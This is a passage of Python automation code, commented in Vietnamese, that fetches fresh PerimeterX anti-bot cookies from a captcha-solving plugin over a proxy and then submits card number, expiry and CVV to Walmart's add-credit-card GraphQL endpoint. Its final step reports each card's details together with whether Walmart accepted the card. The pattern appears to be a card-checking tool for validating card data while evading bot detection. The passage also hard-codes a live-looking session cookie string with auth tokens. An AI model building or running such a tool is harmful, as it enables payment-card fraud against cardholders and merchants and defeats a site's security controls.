        print(f"DEBUG - Error adding px cookies to via_tls: {e}")
        import traceback
        traceback.print_exc()


@step("refresh_captcha_for_credit_card")
def refresh_captcha_for_credit_card(ctx):
    """Gọi captcha plugin để lấy _px3 cookie mới cho credit card creation"""
    
    # Lấy proxy từ session
    session_proxy = ctx.session.get("proxy", "")
    print(f"DEBUG - Refreshing captcha for credit card with proxy: {session_proxy}")
    
    # Chuẩn bị tham số cho Captcha plugin
    captcha_params = {
        "auth": "S[0EG;<67GH05EE607:I30E:F80I3F7:ED5E<I5",
        "site": "walmart",
        "proxyregion": "us",
        "region": "com",
        "proxy": session_proxy
    }
    
    print(f"DEBUG - Calling captcha plugin for credit card with params: {captcha_params}")
    
    # Tạo instance CaptchaWrapper trực tiếp
    captcha_wrapper = CaptchaWrapperClass()
    
    # Gọi Captcha plugin để lấy _px3 mới
    result = captcha_wrapper.generate_and_hold_captcha(
        flow_id=getattr(ctx, 'uuid', None),
        **captcha_params
    )
    
    print(f"DEBUG - Captcha plugin result for credit card: {result}")
    
    if result.get("success"):
        # Cập nhật _px3 mới
        # Cập nhật _px3 mới - xử lý cookie có prefix _px3=
        if result.get("cookie"):
            cookie_value = result.get("cookie", "")
            # Loại bỏ _px3= prefix nếu có
            if cookie_value.startswith("_px3="):
                ctx.cookie_px3 = cookie_value[5:]  # Bỏ qua 5 ký tự đầu "_px3="
            else:
                ctx.cookie_px3 = cookie_value
            print(f"DEBUG - Updated _px3 for credit card: {ctx.cookie_px3[:50]}...")
        
        # Cập nhật các giá trị khác nếu cần
        if result.get("UserAgent"):
            ctx.px_ua = result.get("UserAgent", "")
        if result.get("secHeader"):
            ctx.px_sechua = result.get("secHeader", "")
        if result.get("pxhd"):
            ctx.cookie_pxhd = result.get("pxhd", "")
        if result.get("vid"):
            ctx.cookie_pxvid = result.get("vid", "")
        if result.get("cts"):
            ctx.cookie_pxcts = result.get("cts", "")
        # Cập nhật cookie_all_via_tls với _px3 mới
        # Cập nhật cookie_all_via_tls với _px3 mới
        if ctx.cookie_px3:
            # Cập nhật _px3 trong cookie_all_via_tls hiện tại
            current_cookies = ctx.get("cookie_all_via_tls", "")
            print(f"DEBUG - Current cookie_all_via_tls length: {len(current_cookies)}")
            print(f"DEBUG - Current cookie_all_via_tls preview: {current_cookies[:200]}...")
            
            if current_cookies:
                cookie_list = current_cookies.split("; ")
                updated_cookies = []
                for cookie in cookie_list:
                    if cookie.startswith("_px3="):
                        updated_cookies.append(f"_px3={ctx.cookie_px3}")
                    else:
                        updated_cookies.append(cookie)
                ctx.cookie_all_via_tls = "; ".join(updated_cookies)
                print(f"DEBUG - Updated cookies with new _px3 for credit card")
                print(f"DEBUG - Total cookies for credit card: {len(updated_cookies)}")
                print(f"DEBUG - Final cookie_all_via_tls length: {len(ctx.cookie_all_via_tls)}")
            else:
                # Fallback nếu không có cookies
                ctx.cookie_all_via_tls = f"_px3={ctx.cookie_px3}"
                print(f"DEBUG - WARNING: No existing cookies found! Created new cookie_all_via_tls with _px3 only (fallback)")
                print(f"DEBUG - This means previous steps didn't populate cookie_all_via_tls properly!")
        
    else:
        # Xử lý lỗi
        error_msg = result.get("error", "Unknown captcha error")
        print(f"DEBUG - Captcha plugin failed for credit card: {error_msg}")
        ctx.status = "BAN"
        raise AssertionError(f"BAN: Captcha plugin failed for credit card: {error_msg}")


@step("create_credit_card")
def create_credit_card(ctx):
    custom_cookie = "ACID=7d60f9ac-9158-4cc7-a700-a8917394fade; hasACID=true; abqme=true; vtc=YTPzCPVZZ0OTpH7c27RA7w; _pxhd=aa686262fec021023ec8dc82956bf1a2fcbc6a2b74e9b8ae7452206e65aab12d:3d4750b6-9c76-11f0-bd8a-88f4403879a8; isoLoc=VN_HN_t3; io_id=54605ce0-5a16-4025-9c90-cd83c816a18c; _m=9; userAppVersion=usweb-1.224.0-fb801e0fe2dd28531a9b6c1d77cb85044cf70d55-9251249r; _astc=9559d4594c147f3f3c4c25688e580987; walmart-identity-web-code-verifier=aVbAcXFNXpG5wqDCd6H4fyveOUJNHeBQ0Pn4Gxz_Yog; pxcts=3fa0601a-9c76-11f0-a667-d1059039cc5b; _pxvid=3d4750b6-9c76-11f0-bd8a-88f4403879a8; assortmentStoreId=3081; hasLocData=1; TS012af430=0137085862ef261fc35b154d563dae634fc2d8b11d9bb9039e3b26a60f2fc973c455ace6a812e386ca0198623b7da701cd82ba8485; CID=a16f8dc0-3fd8-40b6-8e34-34881880d399; SPID=MDYyMTYyMDI1R8HRsmd0YPj2oTJaF33pyw8DN_d9G1xwoIuXUkTx9fyT5OFzMolq9393-DPcivaBPdCKtWLWTW2WiycECFBSq6H2pAYiWV6XKbXPCw; customer=%7B%22firstName%22%3A%22George%22%2C%22lastNameInitial%22%3A%22L%22%2C%22ceid%22%3A%2225a007347f450489af134a8a10a6fa30e1baa8740e7c29c25c31398d97b9083a%22%7D; hasCID=1; type=REGISTERED; wm_accept_language=en-US; locGuestData=eyJpbnRlbnQiOiJTSElQUElORyIsImlzRXhwbGljaXQiOmZhbHNlLCJzdG9yZUludGVudCI6IlBJQ0tVUCIsIm1lcmdlRmxhZyI6ZmFsc2UsImlzRGVmYXVsdGVkIjp0cnVlLCJwaWNrdXAiOnsibm9kZUlkIjoiMzA4MSIsInRpbWVzdGFtcCI6MTc1OTA2OTIxMzYzNSwic2VsZWN0aW9uVHlwZSI6IkRFRkFVTFRFRCJ9LCJzaGlwcGluZ0FkZHJlc3MiOnsidGltZXN0YW1wIjoxNzU5MDY5MjEzNjM1LCJ0eXBlIjoicGFydGlhbC1sb2NhdGlvbiIsImdpZnRBZGRyZXNzIjpmYWxzZSwicG9zdGFsQ29kZSI6Ijk1ODI5IiwiZGVsaXZlcnlTdG9yZUxpc3QiOlt7Im5vZGVJZCI6IjMwODEiLCJ0eXBlIjoiREVMSVZFUlkiLCJ0aW1lc3RhbXAiOjE3NTkwNjkyMTM2MzQsImRlbGl2ZXJ5VGllciI6bnVsbCwic2VsZWN0aW9uVHlwZSI6IkRFRkFVTFRFRCIsInNlbGVjdGlvblNvdXJjZSI6bnVsbH1dLCJjaXR5IjoiU2FjcmFtZW50byIsInN0YXRlIjoiQ0EifSwicG9zdGFsQ29kZSI6eyJ0aW1lc3RhbXAiOjE3NTkwNjkyMTM2MzUsImJhc2UiOiI5NTgyOSJ9LCJtcCI6W10sIm1zcCI6eyJub2RlSWRzIjpbXSwidGltZXN0YW1wIjpudWxsfSwibXBEZWxTdG9yZUNvdW50IjowLCJzaG93TG9jYWxFeHBlcmllbmNlIjpmYWxzZSwic2hvd0xNUEVudHJ5UG9pbnQiOmZhbHNlLCJtcFVuaXF1ZVNlbGxlckNvdW50IjowLCJ2YWxpZGF0ZUtleSI6InByb2Q6djI6N2Q2MGY5YWMtOTE1OC00Y2M3LWE3MDAtYTg5MTczOTRmYWRlIn0=; AID=wmlspartner=0:reflectorid=0000000000000000000000:lastupd=1759069215814; __pxvid=41df98b8-9c76-11f0-86f5-5a33725df641; if_id=FMEZARSF93kiRBJOaLpFxSlH39nj0fiaTYIVsgFd/ReRtbCdaw9fMW697Qmvd14UTYKX6qA6SJATxQRbdms2vhTHMy9nGre4TLqXKuIrHk73CrRQp3ElGWgZrfrD1JwvbeKBC0jbjZr6YxVwDDG1oPvYUk0coxlI87gTAw1MgfhyfmMYDVOol0iIqa47jr20RdL862hLav62p11kk3rFiJm5ZBR/VnFmOKJCsekmOSlvzMjR28Fg8TCT422k69yz0nBN4vBvrwN3G+k1cwtKnEA/+vKcf2cwc4/5cg0GZj3lcAow309yL9cMUNp8uT9RN9GsAyWstJyhEUQrPQ==; TS016ef4c8=01a0035ddc754f54add7c9e99793c5c96233a6b4c246bbcf806f7d16b2590f1482500129d8316158d77a369b3157d4ef088f084394; TS01f89308=01a0035ddc754f54add7c9e99793c5c96233a6b4c246bbcf806f7d16b2590f1482500129d8316158d77a369b3157d4ef088f084394; TS8cb5a80e027=08e9f9024aab20000ec3925ebc20cf5df101a9849e37df1590089b97eb47211103980dbc689a18620804debb54113000dfee313146045f9a8a6dbd82d4e6c577e5b8bd6ab0fc1f496b11e36d555f8b99ac05d585ea04da3c98f1e314de7379db; xpa=-5-yD|-dl5I|-hwLU|1DB8T|2Brwr|3Kopn|3Xes_|3d8P6|3lffD|4950w|4mZde|66yjf|7IMe9|7ZWez|8UWH4|BYzSI|EGJef|EaBfd|EeXYg|FgoiY|Gk6n1|I9nzL|IPd0z|KJIJs|KYp8P|LTduQ|LkfJa|M62Wj|Mx7J7|OLPlS|Oi5D4|P1gpb|P3aPs|PKA1g|QPToB|RL078|RTwYn|S7Hy9|TCS94|TO_e8|Tq8sA|UXYCa|Uhyp2|VFOGI|Vtlq3|XTqP_|_7RrM|_MmQi|bmd5b|bzMJc|c9SXY|dEGcY|dkTyl|eVb-j|f4tI4|fdm-7|flqYL|h6nfw|iHk39|j2D95|jM1ax|jPq86|kD20O|lDoEE|nd-Kk|o0JjB|ozs5w|pC-ah|pVetj|q00Zt|sYZ7o|tyEVT|u7rEL|vG33N|yFWY4|zR-nl; exp-ck=-hwLU11DB8T32Brwr33Xes_c3d8P613lffD14950w14mZde166yjf17ZWez18UWH41BYzSI1EGJef1EaBfd1Gk6n11KJIJs1KYp8P1LTduQ1LkfJa1Mx7J72OLPlS1P3aPs1PKA1g1QPToB1S7Hy92TCS941TO_e81Tq8sA1UXYCa1Uhyp21VFOGI1Vtlq32XTqP_1_7RrM4_MmQi1c9SXY1dEGcY3f4tI41fdm-71flqYL5h6nfw3iHk391j2D954jPq865kD20O6nd-Kk1ozs5w1pC-ah1pVetj1q00Zt2sYZ7obtyEVT1u7rEL1vG33N1; ak_bmsc=F9B3E497DD54FBEDFF90D71E6A570D84~000000000000000000000000000000~YAAQVzNDG8gzzYaZAQAAyp3hkR1yyS33udh3b15TMmf1mUhzmhh8H/qzXaLWV2caHlTY5rxdAbczTfeZwXFZHIataXsTuxwNbUNiubZII6LOoOI7pl0Tkiaz+AkSuDGYfEYnFWCQ2dve3eNSTkQfjf9H1JAsnus+0F48HhR6y5rVxpsDj5iusAB8R4cHTFLHK7Odn2dYIGlyDB3RFjKnSwKrxR0PA63NLKFt+On6v7QZlJmQM5lxKWLBknbV2LfYfeGq+P8mU9sglkMv7bHv08rdzz08M3fWBnM7Z2QstsD6bj1VVWGMxLH99Oti911zbvqblJrWQpweeGKJDtuOBdqtJ+ee4T6KRVePKVb9MFPwPUHqy2pt5CM4B4qw8+cIGlyqZOLwECpnYgXEQbRN; bstc=Uh4bH5X2WGsmbvfIDkyk84; _s=:1759089113401; _sc=FS9+kp+7LWfkjIZrgnGHYTYlvXG19E1HuZZgI5iM5WU=; _tpl=40; _tplc=+GY+aALw+n1Uduj87mc+9jMs4lBMpRokKZFbWnIOcBM=; _intlbu=false; _shcc=US; xpth=x-o-mart%2BB2C~x-o-mverified%2Bfalse; xptwj=uz:cf2c7532aeb998de1b3c:H8OXu824tMm4qRlmPJunkX9qF+Dc1l+GyEZYHHF+ewilB+a+QmA4iNsgu9GTd4mjqRBIxpjm1hy1wC7tT5uwwQIgp+xMaAu9ZvBu+ZqviJw2c0BNTzV+gHze5TJ3TwG1JOkrW8t7Cc89pPiAKQ3+/fdvbkVAaut//P4CyLdmLd5LOZVHKC01saVjxA==; bm_mi=F2878A4073F92C3E7C5D74E9F093A0F1~YAAQZTNDGyfGdYaZAQAA2brhkR2oRqIuyAttu0ugDzW7j8uIWzwGquIsjX9kWQgV9dUcdZWJqSKlm4pZPFFl8voMpHAe7aoyNnO1iL/dL1n9Grr92hR8Emi1wsv8iCTv3hKyWcZX1lMgh6h6UF8tmZmgAZi0rIV4UtGRbJrsVB1gigMceH5pLf4tmQsWi64TSaqDHDdLxv6KIGHJt7SbNVlnjrRNn+62Jn0afyZXTPx2ReMfFaA9JFvhSUHAuGQjFhwZTJt0E8PrWcZ3xgoJzfqIaZhxMOfyqr7nxFpPQrKkRKPMMkaA75MxxyFkr/rSpiicGGzu9Iro31nk7frP2T4YqYjAYFVp~1; mp_9c85fda7212d269ea46c3f6a57ba69ca_mixpanel=%7B%22distinct_id%22%3A%20%22%24device%3A19990b1db665b2-07d37409bccb5c-7e433c49-1fa400-19990b1db665b2%22%2C%22%24device_id%22%3A%20%2219990b1db665b2-07d37409bccb5c-7e433c49-1fa400-19990b1db665b2%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fwww.walmart.com%2F%22%2C%22%24initial_referring_domain%22%3A%20%22www.walmart.com%22%2C%22__mps%22%3A%20%7B%7D%2C%22__mpso%22%3A%20%7B%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fwww.walmart.com%2F%22%2C%22%24initial_referring_domain%22%3A%20%22www.walmart.com%22%7D%2C%22__mpus%22%3A%20%7B%7D%2C%22__mpa%22%3A%20%7B%7D%2C%22__mpu%22%3A%20%7B%7D%2C%22__mpr%22%3A%20%5B%5D%2C%22__mpap%22%3A%20%5B%5D%7D; _tsc=MTQyODYyMDIyGxHu6U0iI5L0dK8jG7JuRJLXFyNl6L66T%2BawUUTrjZovbNVjh1UtpofQgdHl61dq1ARq0FxMGQwmcCoN%2BaM3Wf3n8H%2BleqQpjc5g5JttCvdI5jR4m6WwengQ6Oli5uHOCmsQn39NHTOvzIjbl60mSgVA1mCYqDe4W37gIogEWqQW%2Bc9%2BzG0GValuzKK4o7WXlBZiL6UeOnhaOCBAbFbp5uakm4n5DqihSwuCykvQLOmGU12%2B4DiMgDP%2F6HG%2FN4vod4QcUUAwS5oFS0VoBuReqlwRg9aOGsvb2AD%2Fdg88zPHgzML3mhI3sxpI7b9B4SXKrdWlbneJJcl9wUWw3YKA9Vq8VNMZEJ3HWsImlz76XKo8DXzJJYTDNDfNWQDRPEbY%2B28nXHHffenmf8ESEBO9d3Bx1nIr9bATkU9xgJzxFen%2Bp9ByO4H4otJO3NiPH%2BTDhg%2FwReuUTkjxFQ%3D%3D; _vc=BTZQZ5Qzw25FmBtrsaoLAAjdtuIAmji7uLlHvt%2BfIBk%3D; auth=MTAyOTYyMDE4gbLnSCGU65UH84lBzLoJ8OYxNHwk9CuP68AVSn40ZprN5XjHXh2YEwc4AdpcTphyOd6IrQFTKzUn1gdnHv3MwCnSDCDbyZPilPG8tEgeCAMe0kk71JFQo0Jehzv5B%2Bb9tp4PYtnTPrH3YwCBYIU2jmzUCdxxZsivkQ3PhCH2a63ajw5z9q9AFqkSgFlyfE3tZOUTgCWTUPpBUQ0BsmWeTEOmufKwVHRCRqMPUsZ6WpKqGXTRjJD7g6PyDs3UqmGUpGd2w9VMvEOMsmi01MtA%2F%2BjC%2FkXNt5gv2Ux4Ku%2BozcsTZQYlcbwSrIQJ6%2BWWFLtDzsDD8rhlZOa%2FhgQxqp0YPAFhEHJYgGD00%2FxMAzhrl8i%2FewOPf%2FBzp5sIAzshwikRIw6vTt8V7%2BqSWYVIQ3Oe3ful%2FFbuEYzUhsKWW6sYaVQ%3D; xptc=_m%2B9~_s%2B:1759089113401~assortmentStoreId%2B3081; akavpau_p4=1759089714~id=94198b11ca36f07a801e33bd851b4480; AZ_ST_CART=%7B%22mtoken%22%3A%22804%3A42%23516479592%235%3D104104897%238%3D418917707%22%2C%22itoken%22%3A%7B%22UK_CART_OWNER_T_V%22%3A%22435%3A59%23168700916%235%3D37590072%238%3D63970792%22%7D%7D; undefined=OMNI_PROMISE; com.wm.reflector=\"reflectorid:0000000000000000000000@lastupd:1759089115000@firstcreate:1759069209708\"; _lat=MDYyMTYyMDI1tdEQFARwYZ2uHiPNGR-pxe0V5pKMCO-Km-Z6FhDauQCEVbtTbUiPlcQ; _msit=MDYyMTYyMDI1N-JEBtKo-JFXhPO0U6JqR-H8v00GCizmi6YORD2Wgl4bxioQ; xpm=1%2B1759089114%2BYTPzCPVZZ0OTpH7c27RA7w~a16f8dc0-3fd8-40b6-8e34-34881880d399%2B0; xptwg=2918571031:122B4354CFF3BC0:2C5C756:3F1324CF:1AD2ED4E:CFA83D93:; TS012768cf=01c8291f66f34ed65374c421165ee98157826e30edd47049d47b3f4c36aa084eea974c0cac9173c47524228bc5338c87a77df41b69; TS01a90220=01c8291f66f34ed65374c421165ee98157826e30edd47049d47b3f4c36aa084eea974c0cac9173c47524228bc5338c87a77df41b69; TS2a5e0c5c027=084555058bab2000e297f8775548938323f3206966d007b038a3c1f9eea37e52822031f819cace020893a324fa113000c0c017a24572c94ba5edcee028676f282a9a2c5777e616613c5be6a5f8b45b511b786f34247cd0a06eed75cd36885cc9; akavpau_p2=1759089715~id=b3833c10495e07f6a8dca80a0540b09e; bm_sv=D4B50C29FA9B2C4C2E5A3FD5601DB39F~YAAQZTNDGzHGdYaZAQAACcLhkR23ji3R7qAR1xlRtMceSq5bCb7+hDIGpcduLV4gAAE/MCKPCQfX3DMhZbqUwee9v5WmBfr+tvziCiP4gaojUeoGVSeprI6nqMUTODQf0Yxapc+yWn5HxIl9z3Qi26zQKG4H+ExQEwOwCt9IR048eQgCgbpYUjRm6pxX2FY5oT+mpVNiZbyLDBGLrEZq4nW75+0UvnRgfH2m+xspwnI1O6lhMqsoMh3asyVfDrdKxQ==~1; _px3=1099d01c3b9fbff4698df6829a5b5306e757a51ca35205c8d88ccc6a577e0575:CDB/yo5xF8D6rUXscO6aKq+egoUqdxqC7+ZCz9efxdTsJSCSs8A8ndxGtMIya+oTQC2EXCq4Ag/ST8ajrBx05g==:1000:51yTyHoMjr4SZUcJmY4DsyZaTZuatjb2IVWUEjMOYigU8lWPoc1XXpHv4cn4gJiK2u+lrY0kpL3qcYDIAAVnTmGZdyotFe7UWPRrzBnwARywfkgb7E6BHF3XGOs6oYXhgL64d9w5fP4+Pj0ToJv/R8eO9BGMPWXEBtVd89c+bIz4oai2ktKxSopricWJJhdsscWFRQ7YHbPBepo13cX8rwk4yEJOTMp5ubZt6RbImKA=; _pxde=5d96a1f20b10dee84c250ea1bf6d9fa48c5df509cba8fa97"
    user_agent = ctx.get("px_ua") or ctx.get("Ua")
    
    # Sử dụng sec-ch-ua từ captcha plugin hoặc fallback
    sec_ch_ua = ctx.get("px_sechua") or ctx.get("sechua")
    """Gọi API GraphQL để tạo credit card"""
    url = "https://www.walmart.com/orchestra/home/graphql/CreateAccountCreditCard/21ac463209f91772706c73b0a5735933011e9da684b0b20060c46c2f61c2fcc4"
    
    # Chuẩn bị body với dữ liệu thực tế
    body_data = {
        "variables": {
            "input": {
                "firstName": "gia",
                "lastName": "hoang", 
                "expiryMonth": int(ctx.MM),
                "expiryYear": int(ctx.YYYY),
                "isDefault": True,
                "phone": "(714) 657-4874",
                "address": {
                    "addressLineOne": "Long Beach Rd SE",
                    "addressLineTwo": "",
                    "postalCode": "28461",
                    "city": "Southport",
                    "state": "NC",
                    "colony": "",
                    "municipality": "",
                    "isApoFpo": None,
                    "isLoadingDockAvailable": None,
                    "isPoBox": None,
                    "businessName": None,
                    "addressType": None,
                    "sealedAddress": None
                },
                "cardType": "VISA",
                "integrityCheck": ctx.get("protected_mac", ""),
                "keyId": ctx.get("key_id", ""),
                "phase": "1",
                "encryptedPan": ctx.get("protected_s", ""),
                "encryptedCVV": ctx.get("protected_q", ""),
                "sourceFeature": "ACCOUNT_PAGE",
                "checkoutSessionId": None
            },
            "fetchWalletCreditCardFragment": True,
            "enableHSAFSA": True,
            "enableGEPCountryOfResidenceNudge": False
        }
    }
    
    # Debug body trước khi gửi
    print(f"DEBUG - Sending credit card data:")
    print(f"DEBUG - protected_mac: {ctx.get('protected_mac', '')[:50]}...")
    print(f"DEBUG - key_id: {ctx.get('key_id', '')}")
    print(f"DEBUG - protected_s: {ctx.get('protected_s', '')[:50]}...")
    print(f"DEBUG - protected_q: {ctx.get('protected_q', '')[:50]}...")
    
    # Debug cookies trước khi gửi
    cookies_to_send = ctx.get("cookie_all_via_tls", "")
    print(f"DEBUG - Sending cookies to credit card API:")
    print(f"DEBUG - Cookie length: {len(cookies_to_send)}")
    print(f"DEBUG - Cookie count: {len(cookies_to_send.split('; ')) if cookies_to_send else 0}")
    print(f"DEBUG - First 300 chars: {cookies_to_send[:300]}...")
    print(f"DEBUG - Last 300 chars: ...{cookies_to_send[-300:] if len(cookies_to_send) > 300 else cookies_to_send}")
    
    # Kiểm tra các cookies quan trọng
    important_cookies = ['_px3', 'com.wm.reflector', 'userAppVersion', 'vtc', 'bstc', 'ak_bmsc']
    for cookie_name in important_cookies:
        if cookie_name in cookies_to_send:
            print(f"DEBUG - Found {cookie_name} in cookies")
        else:
            print(f"DEBUG - MISSING {cookie_name} in cookies!")
    
    r = (http.post(url)
           .header("X-O-Mart", "B2C")
           .header("X-O-Gql-Query", "mutation CreateAccountCreditCard")
           .header("Sec-Ch-Ua-Platform", '"Windows"')
           .header("X-O-Segment", "oaoh")
           .header("Sec-Ch-Ua", sec_ch_ua)
           .header("X-Enable-Server-Timing", "1")
           .header("Sec-Ch-Ua-Mobile", "?0")
           .header("X-Latency-Trace", "1")
           .header("Wm_mp", "true")
           .header("Accept", "application/json")
           .header("Content-Type", "application/json")
           .header("X-Apollo-Operation-Name", "CreateAccountCreditCard")
           .header("Tenant-Id", "elh9ie")
           .header("Downlink", "4.1")
           .header("X-O-Platform", "rweb")
           .header("X-O-Platform-Version", "usweb-1.223.0-d799c290ac70a8fe329fbd88bdf2013e64863228-9190130r")
           .header("Accept-Language", "en-US")
           .header("X-O-Ccm", "server")
           .header("X-O-Bu", "WALMART-US")
           .header("Dpr", "1")
           .header("User-Agent", user_agent)
           .header("Origin", "https://www.walmart.com")
           .header("Sec-Fetch-Site", "same-origin")
           .header("Sec-Fetch-Mode", "cors")
           .header("Sec-Fetch-Dest", "empty")
           .header("Referer", "https://www.walmart.com/wallet")
           .header("Accept-Encoding", "gzip, deflate, br")
           .header("Priority", "u=1, i")
           .header("cookie", ctx.get("cookie_all_via_tls", ""))
           .json(body_data)
           .label("walmart-create-credit-card")
           .via_tls()
           .timeout(30.0)
           .send())
    
    # Lưu response để debug
    ctx.credit_card_response = r.text()
    ctx.credit_card_status = r.status
    ctx.credit_card_headers = dict(r.headers)
    
    print(f"DEBUG - Credit card creation status: {r.status}")
    print(f"DEBUG - Credit card response length: {len(ctx.credit_card_response)}")
    
    # In ra response để debug
    print("=" * 80)
    print("DEBUG - CREDIT CARD CREATION RESPONSE:")
    print("=" * 80)
    print(ctx.credit_card_response)
    print("=" * 80)
    
    # Kiểm tra kết quả
    if r.status == 200:
        try:
            response_data = r.json()
            if response_data.get("data", {}).get("createAccountCreditCard", {}).get("success"):
                print("DEBUG - Credit card created successfully!")
                ctx.credit_card_success = True
            else:
                print("DEBUG - Credit card creation failed in response")
                ctx.credit_card_success = False
        except:
            print("DEBUG - Could not parse JSON response")
            ctx.credit_card_success = False
    else:
        print(f"DEBUG - Credit card creation failed with status: {r.status}")
        ctx.credit_card_success = False


@finalize
def done(ctx):
    """Kết thúc flow và trả về kết quả"""
    return {
        "status": ctx.get("status", "UNKNOWN"),
        "uuid": ctx.get("uuid"),
        "http_traces": len(ctx.meta.get("http_trace") or []),
        "CCNUM": ctx.CCNUM,
        "MM": ctx.MM,
        "YYYY": ctx.YYYY,
        "CCV": ctx.CCV,
        "PIEKEY": ctx.get("PIEKEY"),
        "key_id": ctx.get("key_id"),
        "protected_s": ctx.get("protected_s"),
        "protected_q": ctx.get("protected_q"),
        "protected_mac": ctx.get("protected_mac"),
        "legacy_mode": ctx.get("legacy_mode"),
        "cookie_all_via_tls": ctx.get("cookie_all_via_tls"),
        #"cookie_all": ctx.get("cookie_all"),
        "Ua": ctx.get("Ua"),
        "sechua": ctx.get("sechua"),
        "pxhd": ctx.get("pxhd"),
        "session_proxy": ctx.get("session_proxy"),
        #"holdcaptcha_response": ctx.get("holdcaptcha_response"),
        "cookie_px3": ctx.get("cookie_px3"),
        "cookie_pxhd": ctx.get("cookie_pxhd"),
        "px_ua": ctx.get("px_ua"),
        "px_sechua": ctx.get("px_sechua"),
        "cookie_pxvid": ctx.get("cookie_pxvid"),
        "cookie_pxcts": ctx.get("cookie_pxcts"),
        "captcha_plugin_used": True,  # Đánh dấu đã sử dụng Captcha plugin
        "credit_card_status": ctx.get("credit_card_status"),
        "credit_card_success": ctx.get("credit_card_success", False),
        "credit_card_response_length": len(ctx.get("credit_card_response", "")),
    }

flow.register(globals())

if __name__ == "__main__":
    out = flow.run(data={
        "CCNUM": "4111111111111111",
        "MM": "12",
        "YYYY": "2025",
        "CCV": "123"
    }, session={"profile":"chrome_133"}, options={"httpVersion":"h2"})
    print(json.dumps(out, ensure_ascii=False, indent=2))
